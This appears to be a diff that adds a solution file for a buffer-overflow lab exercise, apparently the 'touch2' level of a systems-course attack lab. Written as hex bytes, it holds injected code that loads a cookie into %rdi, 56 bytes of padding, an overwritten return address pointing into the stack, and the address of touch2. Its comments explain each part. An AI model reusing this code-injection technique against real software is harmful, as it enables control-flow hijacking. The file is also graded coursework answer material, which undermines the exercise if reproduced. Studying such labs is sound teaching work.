@@ -1,0 +1,9 @@
+48 c7 c7 0b 76 53 5e c3 /* this sets your cookie to register %rdi */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* the first 56 bytes are just padding */
+68 2f 62 55 00 00 00 00 /* address of register %rsp 0x55622f68 */
+3c 1c 40 00 00 00 00 00 /* address of touch2 (see asm)*/
